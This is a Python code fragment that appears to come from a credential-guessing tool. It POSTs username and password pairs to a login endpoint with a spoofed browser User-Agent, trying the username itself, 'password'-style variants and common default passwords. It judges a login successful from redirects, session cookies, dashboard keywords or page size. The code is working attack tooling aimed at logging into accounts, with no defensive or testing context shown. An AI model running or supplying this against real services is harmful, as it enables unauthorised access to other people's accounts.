def is_successful(response):
    """Better success detection"""
    
    # Check HTTP status codes that indicate success
    if response.status_code in [200, 302, 301]:
        
        # Check for Set-Cookie (session started)
        if response.status_code == 302 or 'Set-Cookie' in response.headers:
            return True, f"Cookie set: {response.headers.get('Set-Cookie', '')[:50]}"
        
        # Check response body for dashboard patterns
        text = response.text.lower()
        success_keywords = [
            "dashboard", "welcome", "profile", "logged in", "log out",
            "sign out", "my account", "user panel", "control panel"
        ]
        
        for keyword in success_keywords:
            if keyword in text:
                return True, f"Contains: {keyword}"
        
        # Check response length (might indicate different page)
        if len(response.text) > 500:  # Dashboard pages are usually larger
            # Check if it's not an error page
            error_keywords = ["invalid", "incorrect", "failed", "denied", "error", "exception"]
            has_error = any(e in text for e in error_keywords)
            
            if not has_error:
                return True, f"Large response: {len(response.text)} bytes (no error keywords)"
    
    return False, f"Status: {response.status_code}, Size: {len(response.text)}"

def test_login(username):
    """Test login for a single username"""
    
    # Method 1: Try username as password
    success, result = test_credentials(username, username)
    if success:
        return True, username, username, result
    
    # Method 2: Try common variations
    for prefix in ["password", "pass", "pwd"]:
        for suffix in ["", "1", "123"]:
            password = f"{prefix}{suffix}"
            success, result = test_credentials(username, password)
            if success:
                return True, username, password, result
    
    # Method 3: Try standard passwords
    standard_passwords = ["admin", "default", "123456", "welcome", "secret", "test"]
    for password in standard_passwords:
        success, result = test_credentials(username, password)
        if success:
            return True, username, password, result
    
    return False, username, None, "No working password found"

def test_credentials(username, password):
    """Test a single username/password combination"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        data = {"username": username, "password": password}
        response = requests.post(target, headers=headers, data=data, timeout=5, allow_redirects=False)
        
        success, reason = is_successful(response)
        return success, f"{username}:{password} - {reason}"
    except Exception as e:
        return False, f"ERROR: {username}:{password} - {str(e)}"

